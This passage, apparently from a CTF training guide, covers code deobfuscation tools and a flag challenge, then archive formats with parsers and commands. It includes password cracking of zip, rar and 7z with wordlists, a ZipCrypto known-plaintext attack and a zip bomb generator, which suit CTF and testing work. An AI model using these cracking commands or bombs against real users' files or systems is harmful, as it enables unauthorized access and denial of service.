        
        return reconstructed
    
    def generate_report(self):
        """Generate deobfuscation report"""
        print("="*60)
        print("DEOBFUSCATION REPORT")
        print("="*60)
        
        techniques = self.detect_obfuscation_type()
        print(f"\nDetected Obfuscation Techniques:")
        for tech in techniques:
            print(f"  • {tech}")
        
        if not techniques:
            print("  [None detected - may be unobfuscated or use unknown methods]")
        
        self.extract_encoded_data()
        
        print(f"\nExtracted Encoded Data: {len(self.findings)}")
        for i, finding in enumerate(self.findings[:10], 1):
            print(f"\n  {i}. Type: {finding['type']}")
            print(f"     Encoded: {finding['encoded']}...")
            
            decoded = finding['decoded']
            if isinstance(decoded, bytes):
                try:
                    decoded = decoded.decode('utf-8', errors='ignore')
                except:
                    decoded = str(decoded)
            
            print(f"     Decoded: {decoded}")
        
        # Look for flags
        all_strings = self.reconstruct_strings()
        flag_pattern = r'CTF\{[^}]+\}'
        flags = []
        
        for string in all_strings:
            matches = re.findall(flag_pattern, string)
            flags.extend(matches)
        
        if flags:
            print(f"\n{'='*60}")
            print(f"🚩 FOUND FLAGS: {len(flags)}")
            print(f"{'='*60}")
            for flag in flags:
                print(f"  {flag}")
        
        return {
            'techniques': techniques,
            'findings': self.findings,
            'flags': flags
        }

# Example usage
obfuscated_sample = """
import base64, zlib, marshal
exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJxLKi5RSEksSVSwtFIoycxNVQgszszPUyjPL8pJAQCMgwm7'))))
s1 = __import__('base64').b64decode('Q1RGe2V4YW1wbGVfZmxhZ30=').decode()
s2 = ''.join(chr(c) for c in [115,101,99,114,101,116])
"""

print("\n=== Automated Deobfuscation ===")
deobf = CodeDeobfuscator(obfuscated_sample)
report = deobf.generate_report()
```

**AST-Based Analysis**

```python
import ast

class ASTAnalyzer(ast.NodeVisitor):
    """
    Analyze Python AST to understand obfuscation
    
    [Inference: Static analysis through abstract syntax tree]
    """
    
    def __init__(self):
        self.exec_calls = []
        self.eval_calls = []
        self.imports = []
        self.suspicious_patterns = []
    
    def visit_Call(self, node):
        """Detect exec() and eval() calls"""
        if isinstance(node.func, ast.Name):
            if node.func.id == 'exec':
                self.exec_calls.append(ast.unparse(node) if hasattr(ast, 'unparse') else 'exec(...)')
            elif node.func.id == 'eval':
                self.eval_calls.append(ast.unparse(node) if hasattr(ast, 'unparse') else 'eval(...)')
        
        self.generic_visit(node)
    
    def visit_Import(self, node):
        """Track imports"""
        for alias in node.names:
            self.imports.append(alias.name)
        self.generic_visit(node)
    
    def visit_ImportFrom(self, node):
        """Track from X import Y"""
        module = node.module or ''
        for alias in node.names:
            self.imports.append(f"{module}.{alias.name}")
        self.generic_visit(node)
    
    def analyze(self, code):
        """Analyze code and generate report"""
        try:
            tree = ast.parse(code)
            self.visit(tree)
            
            print("=== AST Analysis Report ===\n")
            
            if self.exec_calls:
                print(f"[!] Found {len(self.exec_calls)} exec() calls:")
                for call in self.exec_calls[:5]:
                    print(f"    {call[:80]}...")
            
            if self.eval_calls:
                print(f"[!] Found {len(self.eval_calls)} eval() calls:")
                for call in self.eval_calls[:5]:
                    print(f"    {call[:80]}...")
            
            if self.imports:
                print(f"\n[+] Imports detected:")
                suspicious = ['marshal', 'base64', 'zlib', 'pickle']
                for imp in self.imports:
                    marker = " [SUSPICIOUS]" if any(s in imp for s in suspicious) else ""
                    print(f"    {imp}{marker}")
            
            # Suspicion score
            score = len(self.exec_calls) * 3 + len(self.eval_calls) * 3
            score += sum(3 for imp in self.imports if any(s in imp for s in ['marshal', 'pickle']))
            score += sum(1 for imp in self.imports if any(s in imp for s in ['base64', 'zlib']))
            
            print(f"\nSuspicion Score: {score}/100")
            if score > 10:
                print("[WARNING] Highly suspicious code - likely obfuscated")
            elif score > 5:
                print("[CAUTION] Some suspicious patterns detected")
            else:
                print("[OK] No major red flags")
                
        except SyntaxError as e:
            print(f"[Error] Cannot parse code: {e}")

# Example
analyzer = ASTAnalyzer()
analyzer.analyze(obfuscated_sample)
```

**CTF Challenge: Deobfuscation Exercise**

```python
def create_obfuscation_challenge():
    """
    Create a CTF-style obfuscation challenge
    """
    flag = "CTF{d30bfusc4t10n_m4st3r}"
    
    # Hidden flag with multiple obfuscation layers
    obfuscated = f"""
import base64 as _b, zlib as _z
_x = lambda s: ''.join(chr(ord(c)^0x42) for c in s)
_y = _b.b64decode
_data = _y(b'{base64.b64encode(zlib.compress(_x(flag).encode())).decode()}')
_flag = _x(_z.decompress(_data).decode())

def _check(_input):
    return _input == _flag

# Can you find the flag?
if __name__ == '__main__':
    guess = input("Enter flag: ")
    if _check(guess):
        print("Correct!")
    else:
        print("Try again!")
"""
    
    return obfuscated

print("\n=== CTF Obfuscation Challenge ===")
challenge = create_obfuscation_challenge()
print(challenge)

print("\n=== Solution Walkthrough ===")
print("1. Identify obfuscation layers:")
print("   - XOR with key 0x42")
print("   - Base64 encoding")
print("   - Zlib compression")
print("\n2. Reverse the operations:")
print("   - Base64 decode")
print("   - Zlib decompress")
print("   - XOR with 0x42")
print("\n3. Extract the flag using automated tool:")

deobf_challenge = CodeDeobfuscator(challenge)
deobf_challenge.generate_report()
```

---

**Important Related Topics:**

- Binary obfuscation techniques (packers, protectors, anti-debugging)
- JavaScript obfuscation and deobfuscation tools (JSFuck, JSObfuscator)
- Code virtualization and VM-based protection
- Anti-forensics and anti-reverse engineering techniques
- Symbolic execution for deobfuscation (angr, Triton)
- Machine learning approaches to deobfuscation

---

## Compression

### Overview and Cryptanalytic Context

Compression algorithms reduce data size by exploiting redundancy and patterns. In CTF contexts, compression is relevant for:

- **Archive manipulation and extraction** (password recovery, header repair)
- **Compression-based cryptanalysis** (exploiting information leakage)
- **Steganography detection** (entropy anomalies in compressed data)
- **Known-plaintext attacks** (compression ratios reveal information)

**Core compression principles:**

- **Lossless compression**: Perfect reconstruction of original data
- **Dictionary-based**: Replace repeated patterns with references (LZ77, LZ78)
- **Statistical coding**: Encode frequent symbols with fewer bits (Huffman, arithmetic coding)
- **Entropy**: Theoretical compression limit based on data randomness

### GZIP, BZIP2, LZMA

These are common Unix compression utilities with different algorithms and use cases.

#### GZIP (GNU ZIP)

GZIP uses DEFLATE algorithm (LZ77 + Huffman coding). Fast compression/decompression, moderate compression ratio.

**File structure:**

```
Header (10 bytes minimum):
  - Magic: 0x1f 0x8b
  - Compression method: 0x08 (DEFLATE)
  - Flags: extra fields, filename, comment, CRC
  - Timestamp (4 bytes)
  - Extra flags
  - OS identifier

Compressed data blocks

Footer (8 bytes):
  - CRC32 of uncompressed data
  - Size of uncompressed data (modulo 2^32)
```

**Basic operations:**

```bash
# Compression
gzip file.txt              # Creates file.txt.gz, removes original
gzip -c file.txt > file.gz # Keep original
gzip -9 file.txt           # Maximum compression (slower)
gzip -1 file.txt           # Fastest compression

# Decompression
gunzip file.txt.gz
gzip -d file.txt.gz
zcat file.txt.gz           # Decompress to stdout

# Inspection
file file.gz               # Identify format
zcat file.gz | head        # Preview contents
gzip -l file.gz            # List compressed/uncompressed size

# Force decompression (ignore corruption)
gzip -d -f file.gz
```

**Analyzing GZIP structure:**

```python
#!/usr/bin/env python3
import struct
import zlib
import binascii

def analyze_gzip(filepath):
    """
    Parse and analyze GZIP file structure
    """
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print("=" * 60)
    print("GZIP FILE ANALYSIS")
    print("=" * 60)
    
    # Check magic number
    if len(data) < 10:
        print("[!] File too small to be valid GZIP")
        return
    
    magic = data[0:2]
    if magic != b'\x1f\x8b':
        print(f"[!] Invalid magic number: {magic.hex()}")
        return
    
    print(f"[+] Valid GZIP magic: {magic.hex()}")
    
    # Parse header
    compression_method = data[2]
    flags = data[3]
    mtime = struct.unpack('<I', data[4:8])[0]
    xfl = data[8]
    os = data[9]
    
    print(f"\nHeader Information:")
    print(f"  Compression method: {compression_method} (8 = DEFLATE)")
    print(f"  Flags: 0x{flags:02x}")
    print(f"    FTEXT:    {bool(flags & 0x01)}")
    print(f"    FHCRC:    {bool(flags & 0x02)}")
    print(f"    FEXTRA:   {bool(flags & 0x04)}")
    print(f"    FNAME:    {bool(flags & 0x08)}")
    print(f"    FCOMMENT: {bool(flags & 0x10)}")
    print(f"  Timestamp: {mtime}")
    print(f"  Extra flags: 0x{xfl:02x}")
    print(f"  OS: {os}")
    
    # Parse optional fields
    offset = 10
    
    if flags & 0x04:  # FEXTRA
        xlen = struct.unpack('<H', data[offset:offset+2])[0]
        print(f"\nExtra field length: {xlen} bytes")
        offset += 2 + xlen
    
    if flags & 0x08:  # FNAME
        fname_end = data.index(b'\x00', offset)
        fname = data[offset:fname_end].decode('latin-1', errors='ignore')
        print(f"\nOriginal filename: {fname}")
        offset = fname_end + 1
    
    if flags & 0x10:  # FCOMMENT
        comment_end = data.index(b'\x00', offset)
        comment = data[offset:comment_end].decode('latin-1', errors='ignore')
        print(f"\nComment: {comment}")
        offset = comment_end + 1
    
    if flags & 0x02:  # FHCRC
        header_crc = struct.unpack('<H', data[offset:offset+2])[0]
        print(f"\nHeader CRC16: 0x{header_crc:04x}")
        offset += 2
    
    # Footer (last 8 bytes)
    if len(data) >= 8:
        footer_crc32 = struct.unpack('<I', data[-8:-4])[0]
        uncompressed_size = struct.unpack('<I', data[-4:])[0]
        
        print(f"\nFooter Information:")
        print(f"  CRC32: 0x{footer_crc32:08x}")
        print(f"  Uncompressed size: {uncompressed_size} bytes (mod 2^32)")
    
    # Attempt decompression
    print(f"\nDecompression Attempt:")
    compressed_data = data[offset:-8]
    
    try:
        # DEFLATE decompression (raw, no gzip wrapper)
        decompressed = zlib.decompress(compressed_data, -zlib.MAX_WBITS)
        print(f"  [+] Successfully decompressed: {len(decompressed)} bytes")
        
        # Verify CRC32
        calculated_crc = zlib.crc32(decompressed) & 0xffffffff
        if calculated_crc == footer_crc32:
            print(f"  [+] CRC32 verified")
        else:
            print(f"  [!] CRC32 mismatch: expected 0x{footer_crc32:08x}, got 0x{calculated_crc:08x}")
        
        # Show preview
        preview = decompressed[:200].decode('utf-8', errors='ignore')
        print(f"\nContent preview:")
        print(f"  {preview[:100]}...")
        
    except zlib.error as e:
        print(f"  [!] Decompression failed: {e}")

# Example usage
# analyze_gzip('file.gz')
```

**GZIP manipulation and repair:**

```python
#!/usr/bin/env python3

def repair_gzip_header(data):
    """
    Attempt to repair corrupted GZIP header
    Common CTF scenario: header bytes modified
    """
    print("Attempting GZIP header repair...")
    
    # Fix magic number
    if data[0:2] != b'\x1f\x8b':
        print(f"  [*] Fixing magic number: {data[0:2].hex()} → 1f8b")
        data = b'\x1f\x8b' + data[2:]
    
    # Ensure compression method is DEFLATE
    if data[2] != 0x08:
        print(f"  [*] Setting compression method to DEFLATE")
        data = data[0:2] + b'\x08' + data[3:]
    
    return data

def extract_gzip_data(filepath, output_path):
    """Extract data even from partially corrupted GZIP"""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    # Try standard decompression first
    try:
        with gzip.open(filepath, 'rb') as f:
            decompressed = f.read()
        print("[+] Standard decompression successful")
        return decompressed
    except:
        pass
    
    # Try repairing header
    repaired = repair_gzip_header(data)
    
    # Manual decompression
    try:
        # Skip to compressed data (after variable-length header)
        offset = 10
        flags = data[3] if len(data) > 3 else 0
        
        if flags & 0x04:  # FEXTRA
            xlen = struct.unpack('<H', data[offset:offset+2])[0]
            offset += 2 + xlen
        
        if flags & 0x08:  # FNAME
            offset = data.index(b'\x00', offset) + 1
        
        if flags & 0x10:  # FCOMMENT
            offset = data.index(b'\x00', offset) + 1
        
        if flags & 0x02:  # FHCRC
            offset += 2
        
        compressed = data[offset:-8]
        decompressed = zlib.decompress(compressed, -zlib.MAX_WBITS)
        
        print(f"[+] Manual decompression successful: {len(decompressed)} bytes")
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(decompressed)
        
        return decompressed
        
    except Exception as e:
        print(f"[!] Decompression failed: {e}")
        return None
```

#### BZIP2

BZIP2 uses Burrows-Wheeler Transform (BWT) + Move-To-Front + Huffman coding. Better compression than GZIP for text, slower.

**File structure:**

```
Header: "BZh" + block size (1-9)
Blocks: Multiple compressed blocks
Footer: CRC32 + end marker
```

**Basic operations:**

```bash
# Compression
bzip2 file.txt             # Creates file.txt.bz2
bzip2 -9 file.txt          # Maximum compression (default)
bzip2 -1 file.txt          # Fastest

# Decompression
bunzip2 file.txt.bz2
bzip2 -d file.txt.bz2
bzcat file.txt.bz2         # To stdout

# Inspection
file file.bz2
bzcat file.bz2 | head

# Test integrity
bzip2 -t file.bz2

# Recover from errors
bzip2recover file.bz2      # Attempts to recover blocks
```

**BZIP2 analysis:**

```python
#!/usr/bin/env python3
import bz2

def analyze_bzip2(filepath):
    """Parse BZIP2 file structure"""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print("=" * 60)
    print("BZIP2 FILE ANALYSIS")
    print("=" * 60)
    
    # Check magic
    if not data.startswith(b'BZh'):
        print(f"[!] Invalid BZIP2 magic: {data[:3]}")
        return
    
    print(f"[+] Valid BZIP2 magic: {data[:3].decode()}")
    
    # Block size (1-9)
    if len(data) > 3:
        block_size_char = chr(data[3])
        if block_size_char.isdigit():
            block_size = int(block_size_char) * 100000
            print(f"  Block size: {block_size_char} ({block_size} bytes)")
    
    # Attempt decompression
    try:
        decompressed = bz2.decompress(data)
        print(f"\n[+] Decompression successful: {len(decompressed)} bytes")
        print(f"  Compression ratio: {len(data) / len(decompressed):.2f}")
        
        # Preview
        preview = decompressed[:200].decode('utf-8', errors='ignore')
        print(f"\nContent preview:\n  {preview[:100]}...")
        
    except Exception as e:
        print(f"\n[!] Decompression failed: {e}")

# analyze_bzip2('file.bz2')
```

**BZIP2 block recovery:**

```bash
#!/bin/bash
# Recover individual blocks from corrupted BZIP2

bzip2recover corrupted.bz2

# Creates: rec00001corrupted.bz2, rec00002corrupted.bz2, etc.
# Each recoverable block becomes separate file

for block in rec*corrupted.bz2; do
    echo "Extracting $block..."
    bunzip2 "$block" 2>/dev/null && echo "Success" || echo "Failed"
done
```

#### LZMA / XZ

LZMA (Lempel-Ziv-Markov chain Algorithm) offers best compression ratio, slowest speed. XZ is the modern container format for LZMA2.

**File structure (XZ):**

```
Header: Magic 0xFD 0x37 0x7A 0x58 0x5A 0x00 ("ý7zXZ\0")
Stream flags
Blocks with LZMA2 data
Index
Footer
```

**Basic operations:**

```bash
# Compression (XZ/LZMA)
xz file.txt                # Creates file.txt.xz
xz -9 file.txt             # Maximum compression
xz -e file.txt             # Extreme mode (slower, better ratio)

# Legacy LZMA format
lzma file.txt              # Creates file.txt.lzma

# Decompression
unxz file.txt.xz
xz -d file.txt.xz
xzcat file.txt.xz          # To stdout

# Inspection
file file.xz
xz -l file.xz              # List compressed file info
xzcat file.xz | head

# Test integrity
xz -t file.xz

# Multi-threaded compression (faster)
xz -T4 file.txt            # 4 threads
```

**XZ/LZMA analysis:**

```python
#!/usr/bin/env python3
import lzma

def analyze_xz(filepath):
    """Parse XZ/LZMA file structure"""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print("=" * 60)
    print("XZ/LZMA FILE ANALYSIS")
    print("=" * 60)
    
    # Check XZ magic
    if data.startswith(b'\xfd7zXZ\x00'):
        print("[+] XZ format detected")
        format_type = "XZ"
    elif data.startswith(b'\x5d\x00\x00'):
        print("[+] Legacy LZMA format detected")
        format_type = "LZMA"
    else:
        print(f"[!] Unknown format, magic: {data[:6].hex()}")
        return
    
    # Attempt decompression
    try:
        decompressed = lzma.decompress(data)
        print(f"\n[+] Decompression successful: {len(decompressed)} bytes")
        print(f"  Compression ratio: {len(data) / len(decompressed):.2f}")
        
        # Preview
        preview = decompressed[:200].decode('utf-8', errors='ignore')
        print(f"\nContent preview:\n  {preview[:100]}...")
        
    except Exception as e:
        print(f"\n[!] Decompression failed: {e}")

# analyze_xz('file.xz')
```

**Compression comparison:**

```bash
#!/bin/bash
# Compare compression algorithms

FILE="testfile.txt"

echo "Comparing compression methods on $FILE"
echo "Original size: $(stat -f%z "$FILE" 2>/dev/null || stat -c%s "$FILE") bytes"
echo

# GZIP
gzip -c -9 "$FILE" > test.gz
echo "GZIP:  $(stat -f%z test.gz 2>/dev/null || stat -c%s test.gz) bytes ($(echo "scale=2; $(stat -f%z test.gz 2>/dev/null || stat -c%s test.gz)*100/$(stat -f%z "$FILE" 2>/dev/null || stat -c%s "$FILE")" | bc)%)"

# BZIP2
bzip2 -c -9 "$FILE" > test.bz2
echo "BZIP2: $(stat -f%z test.bz2 2>/dev/null || stat -c%s test.bz2) bytes ($(echo "scale=2; $(stat -f%z test.bz2 2>/dev/null || stat -c%s test.bz2)*100/$(stat -f%z "$FILE" 2>/dev/null || stat -c%s "$FILE")" | bc)%)"

# XZ
xz -c -9 "$FILE" > test.xz
echo "XZ:    $(stat -f%z test.xz 2>/dev/null || stat -c%s test.xz) bytes ($(echo "scale=2; $(stat -f%z test.xz 2>/dev/null || stat -c%s test.xz)*100/$(stat -f%z "$FILE" 2>/dev/null || stat -c%s "$FILE")" | bc)%)"

# Cleanup
rm test.gz test.bz2 test.xz
```

### ZIP, RAR, 7z Compression

Archive formats that combine multiple files with compression and optional encryption.

#### ZIP Format

ZIP is the most common archive format with wide tool support.

**File structure:**

```
Local file headers + compressed data (for each file)
Central directory (index of all files)
End of central directory record
```

**Basic operations:**

```bash
# Creation
zip archive.zip file1.txt file2.txt
zip -r archive.zip directory/        # Recursive
zip -9 archive.zip file.txt          # Maximum compression
zip -e archive.zip file.txt          # Encrypt with password
zip -P password archive.zip file.txt # Password on command line

# Extraction
unzip archive.zip
unzip -d output_dir archive.zip
unzip -l archive.zip                 # List contents
unzip -t archive.zip                 # Test integrity

# Inspection
zipinfo archive.zip
zipinfo -v archive.zip               # Verbose
file archive.zip

# Partial extraction
unzip archive.zip specific_file.txt
unzip archive.zip "*.txt"            # Pattern matching
```

**ZIP structure analysis:**

```python
#!/usr/bin/env python3
import zipfile
import struct

def analyze_zip_detailed(filepath):
    """
    Detailed ZIP file analysis including header inspection
    """
    print("=" * 60)
    print("ZIP FILE DETAILED ANALYSIS")
    print("=" * 60)
    
    with open(filepath, 'rb') as f:
        data = f.read()
    
    # Find local file headers (signature: 0x04034b50)
    offset = 0
    file_count = 0
    
    while offset < len(data) - 4:
        sig = struct.unpack('<I', data[offset:offset+4])[0]
        
        if sig == 0x04034b50:  # Local file header
            file_count += 1
            print(f"\nLocal File Header #{file_count} at offset 0x{offset:x}")
            
            # Parse header
            version = struct.unpack('<H', data[offset+4:offset+6])[0]
            flags = struct.unpack('<H', data[offset+6:offset+8])[0]
            method = struct.unpack('<H', data[offset+8:offset+10])[0]
            mod_time = struct.unpack('<H', data[offset+10:offset+12])[0]
            mod_date = struct.unpack('<H', data[offset+12:offset+14])[0]
            crc32 = struct.unpack('<I', data[offset+14:offset+18])[0]
            comp_size = struct.unpack('<I', data[offset+18:offset+22])[0]
            uncomp_size = struct.unpack('<I', data[offset+22:offset+26])[0]
            name_len = struct.unpack('<H', data[offset+26:offset+28])[0]
            extra_len = struct.unpack('<H', data[offset+28:offset+30])[0]
            
            # Filename
            filename = data[offset+30:offset+30+name_len].decode('utf-8', errors='ignore')
            
            print(f"  Filename: {filename}")
            print(f"  Version: {version}")
            print(f"  Flags: 0x{flags:04x}")
            print(f"    Encrypted: {bool(flags & 0x01)}")
            print(f"    Data descriptor: {bool(flags & 0x08)}")
            print(f"  Compression method: {method}", end="")
            
            methods = {0: "Stored", 8: "DEFLATE", 12: "BZIP2", 14: "LZMA", 95: "XZ", 96: "JPEG", 97: "WavPack", 98: "PPMd"}
            print(f" ({methods.get(method, 'Unknown')})")
            
            print(f"  CRC32: 0x{crc32:08x}")
            print(f"  Compressed size: {comp_size} bytes")
            print(f"  Uncompressed size: {uncomp_size} bytes")
            print(f"  Compression ratio: {(comp_size/uncomp_size*100):.1f}%" if uncomp_size > 0 else "N/A")
            
            offset += 30 + name_len + extra_len + comp_size
        
        elif sig == 0x02014b50:  # Central directory header
            print(f"\nCentral Directory at offset 0x{offset:x}")
            break
        
        else:
            offset += 1
    
    # Use zipfile module for additional info
    try:
        with zipfile.ZipFile(filepath, 'r') as zf:
            print(f"\n" + "=" * 60)
            print("ZIPFILE MODULE ANALYSIS")
            print("=" * 60)
            
            for info in zf.infolist():
                print(f"\n{info.filename}:")
                print(f"  Compressed: {info.compress_size} bytes")
                print(f"  Uncompressed: {info.file_size} bytes")
                print(f"  Compression type: {info.compress_type}")
                print(f"  Modified: {info.date_time}")
                print(f"  CRC: 0x{info.CRC:08x}")
                
                # Check for encryption
                if info.flag_bits & 0x01:
                    print(f"  [!] ENCRYPTED")
                
                # Check for unusual features
                if info.compress_type not in [0, 8]:
                    print(f"  [!] Unusual compression method: {info.compress_type}")
    
    except Exception as e:
        print(f"\n[!] ZipFile module error: {e}")

# analyze_zip_detailed('archive.zip')
```

**ZIP password cracking:**

```bash
# fcrackzip - Fast ZIP password cracker
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt archive.zip
fcrackzip -b -c aA1 -l 1-8 archive.zip  # Brute force, alphanumeric, 1-8 chars

# John the Ripper
zip2john archive.zip > hash.txt
john hash.txt --wordlist=rockyou.txt

# Hashcat (mode 13600 for WinZip, 17200 for PKZIP)
hashcat -m 17200 -a 0 hash.txt rockyou.txt
```

**Known-plaintext attack on ZIP (legacy encryption):**

```python
#!/usr/bin/env python3
import zipfile

def zip_known_plaintext_attack(encrypted_zip, known_plaintext_file, output_zip):
    """
    Attack weak ZIP encryption using known plaintext
    Works on legacy ZipCrypto (not AES)
    
    [Inference] Requires at least 12 bytes of known plaintext
    [Unverified] Success depends on encryption method
    """
    print("ZIP Known-Plaintext Attack")
    print("=" * 60)
    
    # Read encrypted archive
    with zipfile.ZipFile(encrypted_zip, 'r') as zf:
        file_list = zf.namelist()
        print(f"Files in archive: {file_list}")
        
        # Check encryption
        for info in zf.infolist():
            if info.flag_bits & 0x01:
                print(f"[+] {info.filename} is encrypted")
            else:
                print(f"[-] {info.filename} is NOT encrypted")
    
    # Use pkcrack tool (external)
    print("\n[*] Use pkcrack for known-plaintext attack:")
    print(f"    pkcrack -C {encrypted_zip} -c target_file.txt \\")
    print(f"            -P {known_plaintext_file} -p plaintext.txt \\")
    print(f"            -d {output_zip}")
    print("\n[*] Or use bkcrack (modern tool):")
    print(f"    bkcrack -C {encrypted_zip} -c target_file.txt \\")
    print(f"            -p {known_plaintext_file}")

# Example
# zip_known_plaintext_attack('encrypted.zip', 'known.zip', 'decrypted.zip')
```

**ZIP bomb detection and creation:**

```python
#!/usr/bin/env python3

def detect_zip_bomb(filepath, max_ratio=1000, max_size=10*1024*1024*1024):
    """
    Detect potential ZIP bomb (decompression bomb)
    
    Characteristics:
    - Very high compression ratio
    - Nested archives
    - Extremely large uncompressed size
    """
    print("ZIP Bomb Detection")
    print("=" * 60)
    
    try:
        with zipfile.ZipFile(filepath, 'r') as zf:
            total_compressed = 0
            total_uncompressed = 0
            suspicious = False
            
            for info in zf.infolist():
                total_compressed += info.compress_size
                total_uncompressed += info.file_size
                
                # Check individual file ratio
                if info.file_size > 0:
                    ratio = info.file_size / max(info.compress_size, 1)
                    
                    if ratio > max_ratio:
                        print(f"[!] SUSPICIOUS: {info.filename}")
                        print(f"    Compression ratio: {ratio:.0f}:1")
                        suspicious = True
                
                # Check for nested archives
                if info.filename.endswith(('.zip', '.gz', '.bz2', '.xz')):
                    print(f"[!] Nested archive detected: {info.filename}")
                    suspicious = True
                
                # Check enormous uncompressed size
                if info.file_size > max_size:
                    print(f"[!] Extremely large file: {info.filename}")
                    print(f"    Uncompressed: {info.file_size / (1024**3):.2f} GB")
                    suspicious = True
            
            overall_ratio = total_uncompressed / max(total_compressed, 1)
            
            print(f"\nOverall Statistics:")
            print(f"  Compressed: {total_compressed / 1024:.2f} KB")
            print(f"  Uncompressed: {total_uncompressed / (1024**2):.2f} MB")
            print(f"  Ratio: {overall_ratio:.0f}:1")
            
            if overall_ratio > max_ratio:
                print(f"\n[!] WARNING: Possible ZIP BOMB!")
                suspicious = True
            
            if not suspicious:
                print(f"\n[+] Archive appears safe")
            
            return suspicious
    
    except Exception as e:
        print(f"[!] Error analyzing ZIP: {e}")
        return True  # Assume suspicious on error

# detect_zip_bomb('suspicious.zip')
```

**Create ZIP bomb (educational):**

```python
#!/usr/bin/env python3

def create_zip_bomb(output_file='zipbomb.zip', layers=3, base_size=1024*1024):
    """
    Create nested ZIP bomb for testing
    
    [Unverified] Use only for educational purposes and authorized testing
    """
    print("Creating ZIP bomb (educational demonstration)")
    print("=" * 60)
    
    import io
    
    # Create base file (highly compressible)
    base_data = b'\x00' * base_size
    
    current_data = base_data
    
    for layer in range(layers):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f'layer_{layer}.dat', current_data)
        
        current_data = buffer.getvalue()
        
        print(f"Layer {layer}: {len(current_data)} bytes compressed")
    
    # Write final archive
    with open(output_file, 'wb') as f:
        f.write(current_data)
    
    print(f"\n[+] Created {output_file}")
    print(f"    Size: {len(current_data)} bytes")
    print(f"    Expands to: ~{base_size * (10 ** layers)} bytes")

# create_zip_bomb('test_bomb.zip', layers=2, base_size=1024*100)
```

#### RAR Format

RAR offers good compression and recovery records, commonly password-protected in CTFs.

**Basic operations:**

```bash
# Extraction (unrar must be installed)
unrar x archive.rar
unrar e archive.rar               # Extract without paths
unrar l archive.rar               # List contents
unrar t archive.rar               # Test integrity

# With password
unrar x -pPASSWORD archive.rar

# Extract with recovery
unrar x -kb archive.rar           # Keep broken files
```

**RAR password cracking:**

```bash
# rarcrack (slow, brute force)
rarcrack archive.rar --threads 4

# John the Ripper
rar2john archive.rar > hash.txt
john hash.txt --wordlist=rockyou.txt

# Hashcat (mode 12500 for RAR3, 13000 for RAR5)
hashcat -m 13000 -a 0 hash.txt rockyou.txt

# cRARk (GPU-accelerated)
crark -c -l4 -g8 archive.rar
```

**RAR structure analysis:**

```python
#!/usr/bin/env python3
import struct

def analyze_rar(filepath):
    """
    Parse RAR archive structure
    
    [Inference] RAR format is proprietary, analysis limited
    """
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print("=" * 60)
    print("RAR FILE ANALYSIS")
    print("=" * 60)
    
    # Check RAR signature
    if data.startswith(b'Rar!\x1a\x07\x00'):
        print("[+] RAR 1.5 - 4.x format detected")
        version = "RAR 1.5-4.x"
    elif data.startswith(b'Rar!\x1a\x07\x01\x00'):
        print("[+] RAR 5.0+ format detected")
        version = "RAR 5.0+"
    else:
        print(f"[!] Unknown RAR signature: {data[:8].hex()}")
        return
    
    print(f"  Version: {version}")
    
    # Parse blocks
    offset = 7 if version == "RAR 1.5-4.x" else 8
    block_num = 0
    
    while offset < len(data) - 7:
        if offset + 7 > len(data):
            break
        
        # Block header
        crc = struct.unpack('<H', data[offset:offset+2])[0]
        block_type = data[offset+2]
        flags = struct.unpack('<H', data[offset+3:offset+5])[0]
        size = struct.unpack('<H', data[offset+5:offset+7])[0]
        
        block_num += 1
        
        block_types = {
            0x72: "Marker",
            0x73: "Archive header",
            0x74: "File header",
            0x75: "Comment",
            0x76: "Extra info",
            0x77: "Subblock",
            0x78: "Recovery record",
            0x79: "Archive authenticity",
            0x7a: "New-style subblock",
            0x7b: "End of archive"
        }
        
        type_name = block_types.get(block_type, f"Unknown (0x{block_type:02x})")
        
        print(f"\nBlock #{block_num} at offset 0x{offset:x}:")
        print(f"  Type: {type_name}")
        print(f"  CRC: 0x{crc:04x}")
        print(f"  Flags: 0x{flags:04x}")
        print(f"  Size: {size} bytes")
        
        # File header details
        if block_type == 0x74:
            if offset + size <= len(data):
                # Extract filename
                name_offset = offset + 25  # Approximate, varies by version
                name_end = data.find(b'\x00', name_offset, offset + size)
                if name_end > name_offset:
                    filename = data[name_offset:name_end].decode('utf-8', errors='ignore')
                    print(f"  Filename: {filename}")
                
                # Check encryption flag
                if flags & 0x04:
                    print(f"  [!] ENCRYPTED")
        
        # End of archive
        if block_type == 0x7b:
            print("\n[+] End of archive marker found")
            break
        
        offset += size
        
        # Safety check
        if block_num > 1000:
            print("\n[!] Too many blocks, stopping analysis")
            break
    
    print(f"\nTotal blocks: {block_num}")

# analyze_rar('archive.rar')
```

**RAR recovery:**

```bash
# Extract with recovery volumes
unrar x archive.part1.rar

# Repair damaged archive (requires recovery record)
unrar r archive.rar

# Reconstruct from recovery volumes
unrar rc archive.rar
```

#### 7z Format

7z offers excellent compression ratio with LZMA/LZMA2, supports strong encryption.

**Basic operations:**

```bash
# Creation
7z a archive.7z file1.txt file2.txt
7z a -mx=9 archive.7z files/        # Maximum compression
7z a -p archive.7z files/           # Prompt for password
7z a -pPASSWORD -mhe archive.7z files/  # Encrypt headers too

# Extraction
7z x archive.7z
7z e archive.7z                     # Extract without paths
7z l archive.7z                     # List contents
7z t archive.7z                     # Test integrity

# With password
7z x -pPASSWORD archive.7z
```

**7z password cracking:**

```bash
# John the Ripper
7z2john archive.7z > hash.txt
john hash.txt --wordlist=rockyou.txt

# Hashcat (mode 11600)
hashcat -m 11600 -a 0 hash.txt rockyou.txt

# 7z-cracker (Python)
python3 7z-cracker.py -f archive.7z -w rockyou.txt
```

**7z structure analysis:**

```python
#!/usr/bin/env python3
import struct
import lzma

def analyze_7z(filepath):
    """
    Parse 7z archive structure
    """
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print("=" * 60)
    print("7Z FILE ANALYSIS")
    print("=" * 60)
    
    # Check signature
    if not data.startswith(b'7z\xbc\xaf\x27\x1c'):
        print(f"[!] Invalid 7z signature: {data[:6].hex()}")
        return
    
    print("[+] Valid 7z signature")
    
    # Parse header
    major_version = data[6]
    minor_version = data[7]
    start_header_crc = struct.unpack('<I', data[8:12])[0]
